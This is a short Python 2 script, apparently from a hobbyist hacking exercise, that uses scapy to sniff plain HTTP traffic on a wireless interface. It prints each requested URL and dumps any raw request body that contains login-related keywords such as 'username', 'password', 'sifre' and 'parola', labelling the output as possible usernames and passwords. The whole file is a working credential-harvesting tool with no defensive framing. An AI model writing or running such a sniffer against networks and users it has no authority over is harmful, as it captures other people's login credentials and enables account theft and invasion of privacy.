import scapy.all as scapy
from scapy.layers import http
print "\x1b[32m [+] STARTED \x1b[0m"
def sniff(interface):
	scapy.sniff(iface=interface,store=False,prn=process)
def process(packet):
	if packet.haslayer(http.HTTPRequest):
		urls = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
		print "[+] Http Requestss #>>",urls
		if packet.haslayer(scapy.Raw):
			keywords=["username","user","password","login","pass","e-mail","parola","passwd","mail","login","usr","psus","sign","isim","sifre","ad","Password"]
			for keyword in keywords:
				if keyword in packet[scapy.Raw].load:
					print "\x1b[31m[+] Possible Passwords And Usernames #>>  \x1b[0m",packet[scapy.Raw].load
					break
sniff("wlan0")
